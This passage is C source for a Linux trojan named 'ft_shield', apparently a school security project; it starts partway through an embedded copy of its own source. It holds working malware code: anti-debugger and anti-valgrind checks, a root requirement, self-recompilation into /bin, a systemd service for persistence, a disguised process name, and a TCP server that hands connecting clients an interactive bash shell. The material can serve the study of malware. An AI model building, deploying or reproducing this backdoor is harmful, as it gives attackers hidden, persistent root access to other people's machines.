"		int max_fd = set_rw_fdset(clients, &s->rfds, &s->wfds, s->fd);\n"
"\n"
"		int retval = select(max_fd + 1, &s->rfds, &s->wfds, NULL, &tv);\n"
"		if (retval == -1)\n"
"			ft_perror(\"select\");\n"
"		else if (retval != 0)\n"
"		{\n"
"			if (FD_ISSET(s->fd, &s->rfds))\n"
"			{\n"
"				int	client_fd;\n"
"				if ((client_fd = accept(s->fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)\n"
"				{\n"
"					ft_perror(\"accept\");\n"
"					continue;\n"
"				}\n"
"				if (s->nbr_clients == MAX_NBR_CLIENTS)\n"
"				{\n"
"					send(client_fd, MANY_CLIENTS, sizeof(MANY_CLIENTS), 0);\n"
"					ft_dprintf(2, \"Connection denied, too many clients\\n\");\n"
"					close(client_fd);\n"
"					continue;\n"
"				}\n"
"\n"
"				char client_ip[200] = {0};\n"
"				inet_ntop(AF_INET, &address.sin_addr, client_ip, INET_ADDRSTRLEN);\n"
"				int client_port = ntohs(address.sin_port);\n"
"\n"
"				ft_dprintf(2, \"Accepted connection from %s:%d\\n\", client_ip, client_port);\n"
"				s->nbr_clients++;\n"
"				clients[client_fd].fd = client_fd;\n"
"				ft_dprintf(2, \"New client accepted %d\\n\", client_fd);\n"
"				if (clients[client_fd].status == HANDSHAKE)\n"
"					send(client_fd, \"Keycode: \", 10, 0);\n"
"			}\n"
"\n"
"			for (int fd = 0; fd <= max_fd; ++fd)\n"
"			{\n"
"				int c_fd = clients[fd].fd;\n"
"				if (c_fd && FD_ISSET(c_fd, &s->rfds))\n"
"				{\n"
"\n"
"					char buffer[1024] = {0};\n"
"\n"
"					int rb = read(c_fd, buffer, sizeof(buffer) - 1);\n"
"					if (rb < 0)\n"
"					{\n"
"						ft_perror(\"recv\");\n"
"						continue;\n"
"					}\n"
"					else if (rb == 0)\n"
"					{\n"
"						ft_dprintf(2, \"Connection closed %d (recv)\\n\", c_fd);\n"
"						close(c_fd);\n"
"						if (clients[fd].outpipe_fd)\n"
"						{\n"
"							close(clients[fd].outpipe_fd);\n"
"							close(clients[fd].inpipe_fd);\n"
"						}\n"
"						memset(&clients[fd], 0, sizeof(t_client));\n"
"						s->nbr_clients--;\n"
"						continue;\n"
"					}\n"
"					else\n"
"					{\n"
"						s->total_inbytes += rb;\n"
"						clients[fd].inbytes += rb;\n"
"						handle_input(s, fd, buffer);\n"
"					}\n"
"					if (clients[fd].status == HANDSHAKE)\n"
"						add2buffer(&clients[fd], strdup(\"Keycode: \"));\n"
"				}\n"
"				if (c_fd && FD_ISSET(c_fd, &s->wfds)) {\n"
"					int rpipe = 0;\n"
"					if (clients[fd].outpipe_fd) {\n"
"						rpipe = extract_outpipe(s, fd);\n"
"					}\n"
"					if (clients[fd].response_bffr) {\n"
"						int sb;\n"
"						if (rpipe > 0) {\n"
"							sb = write(c_fd,\n"
"								clients[fd].response_bffr,\n"
"								rpipe);\n"
"						} else {\n"
"							sb = write(c_fd,\n"
"								clients[fd].response_bffr,\n"
"								strlen(clients[fd].response_bffr));\n"
"						}\n"
"						if (sb < 0)\n"
"						{\n"
"							ft_perror(\"recv\");\n"
"							continue;\n"
"						}\n"
"						else if (sb == 0)\n"
"						{\n"
"							ft_dprintf(2, \"Connection closed %d (write)\\nBuffer: (%s)\\n\", c_fd, clients[fd].response_bffr);\n"
"							close(c_fd);\n"
"							if (clients[fd].outpipe_fd)\n"
"							{\n"
"								close(clients[fd].outpipe_fd);\n"
"								close(clients[fd].inpipe_fd);\n"
"							}\n"
"							free(clients[fd].response_bffr);\n"
"							memset(&clients[fd], 0, sizeof(t_client));\n"
"							s->nbr_clients--;\n"
"							continue;\n"
"						}\n"
"						s->total_outbytes += sb;\n"
"						free(clients[fd].response_bffr);\n"
"						clients[fd].outbytes += sb;\n"
"						clients[fd].response_bffr = NULL;\n"
"						if (clients[fd].disconnect) {\n"
"							delete_client(s, fd);\n"
"						}\n"
"					}\n"
"				}\n"
"			}\n"
"		}\n"
"		else\n"
"		{\n"
"			t_list *aux = s->passwords;\n"
"			int i = 0;\n"
"			while (aux)\n"
"			{\n"
"				ft_dprintf(2, \"password %d - %s\\n\", i, (char *)aux->content);\n"
"				i++;\n"
"				aux = aux->next;\n"
"			}\n"
"			ft_delete_node_if_true(s, &s->pids, shell_was_closed);\n"
"		}\n"
"	}\n"
"}\n"
"\n"
"void	ft_server(t_server *server)\n"
"{\n"
"	create_server_socket(server);\n"
"	server_loop(server);\n"
"}\n"
"\n"
"\n"
"/* SERVICE.C */\n"
"void	create_service(void)\n"
"{\n"
"	ft_dprintf(2, \"creating service\\n\");\n"
"	int	fd_config = open(DEST_SERVICE, O_WRONLY | O_CREAT | O_TRUNC, 0644);\n"
"	if (fd_config == -1) {\n"
"		ft_perror(DEST_SERVICE);\n"
"		exit(1);\n"
"	}\n"
"	int ret_write = write(fd_config, SERVICE, sizeof(SERVICE));\n"
"	if (ret_write == -1 || ret_write != sizeof(SERVICE)) {\n"
"		ft_perror(\"service\");\n"
"	}\n"
"	close(fd_config);\n"
"}\n"
"\n"
"void	start_service(void)\n"
"{\n"
"	ft_dprintf(2, \"starting service\\n\");\n"
"	system(\"sudo systemctl daemon-reload\");\n"
"	system(\"sudo systemctl enable ft_shield.service\");\n"
"	system(\"sudo systemctl start ft_shield.service\");\n"
"}\n"
"\n"
"\n"
"/* SHELL.C */\n"
"#include <fcntl.h>\n"
"#include <sys/ioctl.h>\n"
"\n"
"int	shell_function(t_server *server, int index)\n"
"{\n"
"	const int	client_fd = server->clients[index].fd;\n"
"	pid_t		pid;\n"
"	int			inpipe_fds[2], outpipe_fds[2];\n"
"\n"
"	ft_dprintf(2, \"clientfd: %d\\n\", client_fd);\n"
"\n"
"	pipe(inpipe_fds);\n"
"	pipe(outpipe_fds);\n"
"	server->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin\n"
"	server->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here\n"
"	\n"
"	pid = fork();\n"
"	if (pid < 0) {\n"
"		ft_perror(\"fork\");\n"
"\n"
"	}\n"
"	else if (pid == 0) {\n"
"		setsid();\n"
"		\n"
"		close(server->fd);\n"
"		close(inpipe_fds[WRITE_END]);\n"
"		close(outpipe_fds[READ_END]);\n"
"		dup2(inpipe_fds[READ_END], STDIN_FILENO);\n"
"		dup2(outpipe_fds[WRITE_END], STDERR_FILENO);\n"
"		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);\n"
"		close(inpipe_fds[READ_END]);\n"
"		close(outpipe_fds[WRITE_END]);\n"
"		close(client_fd);\n"
"\n"
"		char *args[] = {\"/bin/bash\", \"-i\", NULL};\n"
"		setenv(\"TERM\", \"xterm-256color\", 1);\n"
"		execv(\"/bin/bash\", args);\n"
"		exit(1);\n"
"	}\n"
"	else if (pid > 0) {\n"
"		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));\n"
"		close(inpipe_fds[READ_END]);\n"
"		close(outpipe_fds[WRITE_END]);\n"
"	}\n"
"	return (1);\n"
"}\n"
"\n"
"\n"
"/* STEALTH.C */\n"
"int	is_debugger_attached()\n"
"{\n"
"	FILE *file = fopen(\"/proc/self/status\", \"r\");\n"
"\n"
"	if (file == NULL) {\n"
"		ft_perror(\"/proc/self/status\");\n"
"		return (1);\n"
"	}\n"
"\n"
"	while (1) {\n"
"		char line[256] = {0};\n"
"\n"
"		if (fgets(line, sizeof(line), file) == NULL)\n"
"			break;\n"
"		if (strstr(line, \"TracerPid:\")) {\n"
"			int pid = atoi(line + 10);\n"
"			if (pid != 0) {\n"
"				ft_dprintf(2, \"Error: running inside a debugger\\n\");\n"
"				fclose(file);\n"
"				return (1);\n"
"			}\n"
"			break;\n"
"		}\n"
"	}\n"
"\n"
"	fclose(file);\n"
"	return (0);\n"
"}\n"
"\n"
"int	is_valgrind_running()\n"
"{\n"
"	FILE *file = fopen(\"/proc/self/maps\", \"r\");\n"
"\n"
"	if (file == NULL) {\n"
"		ft_perror(\"/proc/self/maps\");\n"
"		return (1);\n"
"	}\n"
"\n"
"	while (1) {\n"
"		char line[256] = {0};\n"
"\n"
"		if (fgets(line, sizeof(line), file) == NULL)\n"
"			break;\n"
"		if (strstr(line, \"valgrind\")) {\n"
"			ft_dprintf(2, \"Running on valgrind\\n\");\n"
"			fclose(file);\n"
"			return (1);\n"
"		}\n"
"	}\n"
"\n"
"	fclose(file);\n"
"	return (0);\n"
"}\n"
"\n"
"void	hide_process_name(char **argv)\n"
"{\n"
"	size_t len = strlen(argv[0]);\n"
"	memset(argv[0], 0, len);\n"
"	strncpy(argv[0], \"PyS <3\", len - 1);\n"
"}\n"
"\n"
"\n"
"/* PRINTS.C */\n"
"#ifdef ENABLE\n"
"# include <stdarg.h>\n"
"# include <time.h>\n"
"#endif\n"
"\n"
"void ft_dprintf(int fd, const char *format, ...)\n"
"{\n"
"	#ifdef ENABLE\n"
"		time_t now = time(NULL);\n"
"		struct tm *t = localtime(&now);\n"
"		dprintf(fd, \"[%02d:%02d:%02d] \", t->tm_hour, t->tm_min, t->tm_sec);\n"
"		\n"
"		va_list args;\n"
"		va_start(args, format);\n"
"		vdprintf(fd, format, args);\n"
"		va_end(args);\n"
"	#else\n"
"		(void)fd, (void)format;\n"
"	#endif\n"
"}\n"
"\n"
"void ft_perror(char *str)\n"
"{\n"
"	#ifdef ENABLE\n"
"		time_t now = time(NULL);\n"
"		struct tm *t = localtime(&now);\n"
"		dprintf(2, \"[%02d:%02d:%02d] \", t->tm_hour, t->tm_min, t->tm_sec);\n"
"		perror(str);\n"
"	#else\n"
"		(void)str;\n"
"	#endif\n"
"}\n"
"\n"
"\n"
"/* UTILS.C */\n"
"char	*ft_strnstr(const char *haystack, const char *needle, size_t len)\n"
"{\n"
"	size_t	pos;\n"
"	size_t	i;\n"
"\n"
"	if (!*needle)\n"
"		return ((char *)haystack);\n"
"	pos = 0;\n"
"	while (haystack[pos] && pos < len)\n"
"	{\n"
"		if (haystack[pos] == needle[0])\n"
"		{\n"
"			i = 1;\n"
"			while (needle[i] && haystack[pos + i] == needle[i]\n"
"				&& (pos + i) < len)\n"
"				++i;\n"
"			if (needle[i] == '\\0')\n"
"				return ((char *)&haystack[pos]);\n"
"		}\n"
"		++pos;\n"
"	}\n"
"	return (NULL);\n"
"}\n"
"\n"
"size_t	ft_strlcpy(char *dest, const char *src, size_t size)\n"
"{\n"
"	size_t	i;\n"
"\n"
"	if (size == 0)\n"
"		return (strlen(src));\n"
"	i = 0;\n"
"	if (size != 0)\n"
"	{\n"
"		while (src[i] != '\\0' && i < (size -1))\n"
"		{\n"
"			dest[i] = src[i];\n"
"			i++;\n"
"		}\n"
"		dest[i] = '\\0';\n"
"	}\n"
"	return (strlen(src));\n"
"}\n"
"\n"
"char	*ft_strtrim(char const *s1, char const *set)\n"
"{\n"
"	char	*final;\n"
"	size_t	i;\n"
"	size_t	size;\n"
"\n"
"	final = NULL;\n"
"	if (s1 != NULL && set != NULL)\n"
"	{\n"
"		i = 0;\n"
"		size = strlen(s1);\n"
"		while (s1[i] && strchr(set, s1[i]))\n"
"			i++;\n"
"		while (s1[size -1] && strrchr(set, s1[size -1]) && size > i)\n"
"			size--;\n"
"		final = calloc((size - i + 1), sizeof(char));\n"
"		if (final == NULL)\n"
"			return (NULL);\n"
"		ft_strlcpy(final, &s1[i], size - i + 1);\n"
"	}\n"
"	return (final);\n"
"}\n"
"\n"
"#define FIXED_OUTPUT_SIZE 16\n"
"#define HEX_OUTPUT_SIZE ((FIXED_OUTPUT_SIZE * 2) + 1)\n"
"\n"
"void simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output)\n"
"{\n"
"	uint8_t buffer[FIXED_OUTPUT_SIZE] = {0};\n"
"	\n"
"	for (size_t i = 0; i < input_len; i++)\n"
"	{\n"
"		for (size_t j = 0; j < FIXED_OUTPUT_SIZE; j++)\n"
"		{\n"
"			buffer[j] ^= input_data[i] + (i * j * 17);\n"
"			buffer[j] = (buffer[j] * 13) % 256;\n"
"		}\n"
"	}\n"
"\n"
"	for (size_t i = 0; i < FIXED_OUTPUT_SIZE; i++)\n"
"	{\n"
"		buffer[i] ^= buffer[(i + 5) % FIXED_OUTPUT_SIZE];\n"
"		buffer[i] += buffer[(i + 11) % FIXED_OUTPUT_SIZE];\n"
"	}\n"
"\n"
"	for (size_t i = 0; i < FIXED_OUTPUT_SIZE; i++)\n"
"		sprintf(output + (i * 2), \"%02X\", buffer[i]);\n"
"	output[HEX_OUTPUT_SIZE - 1] = '\\0';\n"
"}\n"
"\n"
"char	*gen_random_password(void)\n"
"{\n"
"	uint8_t input[64];\n"
"\n"
"	int fd = open(\"/dev/urandom\", O_RDONLY);\n"
"	int ret_read = read(fd, input, 64);\n"
"\n"
"	if (ret_read <= 0)\n"
"		return (NULL);\n"
"	char *password = calloc(HEX_OUTPUT_SIZE, sizeof(char));\n"
"\n"
"	simple_deterministic_id(input, ret_read, password);\n"
"	close(fd);\n"
"	return (password);\n"
"}\n"
"\n"
"static char	*ft_strjoin(char const *s1, char const *s2)\n"
"{\n"
"	size_t	s1len;\n"
"	size_t	s2len;\n"
"	char	*res;\n"
"	size_t	pos;\n"
"\n"
"	s1len = strlen(s1);\n"
"	s2len = strlen(s2);\n"
"	res = malloc(s1len + s2len + 1);\n"
"	if (res == (void *) 0)\n"
"		return (res);\n"
"	pos = 0;\n"
"	while (pos < s1len)\n"
"	{\n"
"		res[pos] = s1[pos];\n"
"		++pos;\n"
"	}\n"
"	pos = 0;\n"
"	while (pos <= s2len)\n"
"	{\n"
"		res[pos + s1len] = s2[pos];\n"
"		++pos;\n"
"	}\n"
"	return (res);\n"
"}\n"
"\n"
"void	add2buffer(t_client *client, char *str) {\n"
"	if (!client->response_bffr) {\n"
"		client->response_bffr = str;\n"
"		return ;\n"
"	}\n"
"	char *new = ft_strjoin(client->response_bffr, str);\n"
"	free(str);\n"
"	free(client->response_bffr);\n"
"	client->response_bffr = new;\n"
"}\n"
"\n"
"/* LST.C */\n"
"t_list	*ft_lstnew(void *content)\n"
"{\n"
"	t_list *lst = calloc(1, sizeof(t_list));\n"
"\n"
"	if (lst == NULL)\n"
"		return (NULL);\n"
"	lst->content = content;\n"
"	return (lst);\n"
"}\n"
"\n"
"t_list	*ft_lstlast(t_list *lst)\n"
"{\n"
"	t_list *aux = lst;\n"
"\n"
"	if (aux == NULL)\n"
"		return (NULL);\n"
"	while (aux->next != NULL)\n"
"		aux = aux->next;\n"
"	return (aux);\n"
"}\n"
"\n"
"void	ft_lstadd_back(t_list **lst, t_list *new_node)\n"
"{\n"
"	if (new_node == NULL)\n"
"		return ;\n"
"	if (*lst == NULL)\n"
"	{\n"
"		*lst = new_node;\n"
"		return ;\n"
"	}\n"
"	ft_lstlast(*lst)->next = new_node;\n"
"}\n"
"\n"
"bool shell_was_closed(t_list *node)\n"
"{\n"
"	pid_t pid_shell = (int)(long)node->content;\n"
"\n"
"	int status;\n"
"	int res_wait = waitpid(pid_shell, &status, WNOHANG);\n"
"	if (pid_shell)\n"
"		ft_dprintf(2, \"active shell: %d res wait %d\\n\", pid_shell, res_wait);\n"
"	if (res_wait == pid_shell)\n"
"	{\n"
"		ft_dprintf(2, \"process %d has finished\\n\", res_wait);\n"
"		return (true);\n"
"	}\n"
"	return (false);\n"
"}\n"
"\n"
"void ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *))\n"
"{\n"
"	t_list *current = *lst;\n"
"	t_list *prev = NULL;\n"
"	t_list *next;\n"
"\n"
"	while (current != NULL)\n"
"	{\n"
"		next = current->next;\n"
"		if (f(current) == true)\n"
"		{\n"
"			ft_dprintf(2, \"deleting node with content %ld\\n\", (long)current->content);\n"
"			//server->nbr_clients--;\n"
"			ft_dprintf(2, \"there are %d connections\\n\", server->nbr_clients);\n"
"			if (prev == NULL)\n"
"				*lst = next;\n"
"			else\n"
"				prev->next = next;\n"
"			free(current);\n"
"		}\n"
"		else\n"
"			prev = current;\n"
"		current = next;\n"
"	}\n"
"}\n"
"\n"
"void	ft_lstdelone(t_list *lst, void (*del)(void *))\n"
"{\n"
"	if (del != NULL)\n"
"		(*del)(lst->content);\n"
"	free(lst);\n"
"}\n"
"\n"
"void	ft_lstclear(t_list **lst, void (*del)(void *))\n"
"{\n"
"	t_list	*tmp;\n"
"\n"
"	while (lst && *lst)\n"
"	{\n"
"		tmp = (*lst)->next;\n"
"		ft_lstdelone(*lst, del);\n"
"		*lst = tmp;\n"
"	}\n"
"}\n"
"\n"
"\n"
"/* FIND_EXEC_PATH.C */\n"
"int	find_own_path(char *buffer, size_t size_buffer)\n"
"{\n"
"	const char *paths[] = {\n"
"		\"/proc/self/exe\",        // Linux\n"
"		\"/proc/curproc/file\",    // FreeBSD\n"
"        \"/proc/self/path/a.out\", // Solaris\n"
"        \"/proc/curproc/exe\",     // NetBSD\n"
"        NULL\n"
"    };\n"
"\n"
"	for (int i = 0; paths[i]; ++i)\n"
"	{\n"
"		int readed = readlink(paths[i], buffer, size_buffer);\n"
"		if (readed != -1)\n"
"		{\n"
"			ft_dprintf(2, \"readlink: [%s]\\n\", buffer);\n"
"			return (i);\n"
"		}\n"
"	}\n"
"	return (-1);\n"
"}\n"
"\n"
"\n"
"/* MAIN.C */\n"
"char path[PATH_MAX] = {0};\n"
"char dir_name[PATH_MAX] = {0};\n"
"\n"
"bool	find_dir(char *dirname)\n"
"{\n"
"	char	*exec_paths = getenv(\"PATH\");\n"
"	char	*location = ft_strnstr(exec_paths, dirname, -1);\n"
"\n"
"	if (location != NULL) {\n"
"		ft_dprintf(2, \"found [%s]\\n\", location);\n"
"		return (true);\n"
"	}\n"
"	return (false);\n"
"}\n"
"\n"
"bool	need_to_install_server(void)\n"
"{\n"
"	if (find_own_path(path, sizeof(path)) == -1) {\n"
"		ft_dprintf(2, \"can't find own executable\\n\");\n"
"		exit(1);\n"
"	}\n"
"\n"
"	memmove(dir_name, path, sizeof(path));\n"
"	dirname(dir_name);\n"
"	ft_dprintf(2, \"dir_name: [%s]\\n\", dir_name);\n"
"	if (find_dir(dir_name) == true) {\n"
"		ft_dprintf(2, \"We are already in the infected path: [%s]\\n\", dir_name);\n"
"		return (false);\n"
"	}\n"
"	ft_dprintf(2, \"we need to install the server: [%s]\\n\", path);\n"
"	return (true);\n"
"}\n"
"\n"
"void	compact_binary(void)\n"
"{\n"
"	char compact_cmd[PATH_MAX] = {0};\n"
"	char *filename = strdup(path);\n"
"\n"
"	ft_dprintf(2, \"binary: %s\\n\", filename);\n"
"	sprintf(compact_cmd, \"cp %s %s.tmp; strip --strip-all %s.tmp; mv %s.tmp %s\", filename, filename, filename, filename, filename);\n"
"	ft_dprintf(2, \"cmd: %s\\n\", compact_cmd);\n"
"	free(filename);\n"
"\n"
"	system(compact_cmd);\n"
"\n"
"	char	*argv[] = {\n"
"		path, \"--compacted\", NULL\n"
"	};\n"
"\n"
"	ft_dprintf(2, \"binary compacted\\n\");\n"
"	ft_dprintf(2, \"----------------\\n\");\n"
"	execv(path, argv);\n"
"	exit(1);\n"
"}\n"
"\n"
"#define TEMP_SHIELD \"/tmp/ft_shield.c\"\n"
"#define DEST_PATH \"/bin/ft_shield\"\n"
"\n"
"void	quine(void)\n"
"{\n"
"	char *source_code = \"@@EMBEDDED_SOURCE@@\";\n"
"	int fd_dst = open(TEMP_SHIELD, O_WRONLY | O_CREAT | O_TRUNC, 0755);\n"
"	if (fd_dst == -1) {\n"
"		ft_perror(TEMP_SHIELD);\n"
"		return ;\n"
"	}\n"
"	write(fd_dst, source_code, strlen(source_code));\n"
"	close(fd_dst);\n"
"	system(\"gcc \"TEMP_SHIELD\" -o \"DEST_PATH);\n"
"}\n"
"\n"
"\n"
"void	install_server(int argc, char **argv)\n"
"{\n"
"	if (argc == 1 && argv[1] == NULL)\n"
"		compact_binary();\n"
"	ft_dprintf(2, \"running as compacted binary\\n\");\n"
"	ft_dprintf(2, \"---------------------------\\n\");\n"
"	printf(\"%s\\n\", \"psegura- & sacorder\");\n"
"	daemon(1, 1);\n"
"	quine();\n"
"	create_service();\n"
"	start_service();\n"
"}\n"
"\n"
"void	exec_troyan(void)\n"
"{\n"
"	t_server server;\n"
"\n"
"	memset(&server, 0, sizeof(t_server));\n"
"	ft_server(&server);\n"
"}\n"
"\n"
"int main(int argc, char **argv)\n"
"{\n"
"	if (is_debugger_attached())\n"
"		return (1);\n"
"	if (is_valgrind_running())\n"
"		return (1);\n"
"	if (geteuid() != 0) {\n"
"		ft_dprintf(2, \"Error: not running as root\\n\");\n"
"		return (1);\n"
"	}\n"
"\n"
"	if (need_to_install_server()) {\n"
"		install_server(argc, argv);\n"
"	} else {\n"
"		hide_process_name(argv);\n"
"		exec_troyan();\n"
"	}\n"
"}\n";
	int fd_dst = open(TEMP_SHIELD, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd_dst == -1) {
		ft_perror(TEMP_SHIELD);
		return ;
	}
	write(fd_dst, source_code, strlen(source_code));
	close(fd_dst);
	system("gcc "TEMP_SHIELD" -o "DEST_PATH);
}


void	install_server(int argc, char **argv)
{
	if (argc == 1 && argv[1] == NULL)
		compact_binary();
	ft_dprintf(2, "running as compacted binary\n");
	ft_dprintf(2, "---------------------------\n");
	printf("%s\n", "psegura- & sacorder");
	daemon(1, 1);
	quine();
	create_service();
	start_service();
}

void	exec_troyan(void)
{
	t_server server;

	memset(&server, 0, sizeof(t_server));
	ft_server(&server);
}

int main(int argc, char **argv)
{
	if (is_debugger_attached())
		return (1);
	if (is_valgrind_running())
		return (1);
	if (geteuid() != 0) {
		ft_dprintf(2, "Error: not running as root\n");
		return (1);
	}

	if (need_to_install_server()) {
		install_server(argc, argv);
	} else {
		hide_process_name(argv);
		exec_troyan();
	}
}
